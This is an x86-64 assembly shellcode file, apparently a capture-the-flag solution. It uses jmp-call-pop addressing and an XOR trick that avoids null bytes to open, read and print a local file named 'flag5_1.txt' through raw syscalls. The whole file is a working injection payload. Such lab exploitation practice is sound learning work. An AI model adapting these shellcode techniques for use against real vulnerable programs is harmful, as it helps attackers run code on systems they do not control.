BITS 64


section .text
global _start
_start:
        jmp _push_filename
_readfile:
        ; syscall open file
        pop rdi
        xor byte [rdi + 11], 0x41
        mov rax, 2
        mov rsi, 0
        syscall

        ; syscall read file
        sub rsp, 0xfff
        lea rsi, [rsp]
        mov rdi, rax
        mov rdx, 0xfff
        mov rax, 0
        syscall

        ; syscall write to stdout
        mov rdi, 1
        mov rdx, 32
        mov rax, 1
        syscall
        ; syscall exit
        mov rax, 60
        syscall


_push_filename:
    call _readfile
    db "flag5_1.txtA"
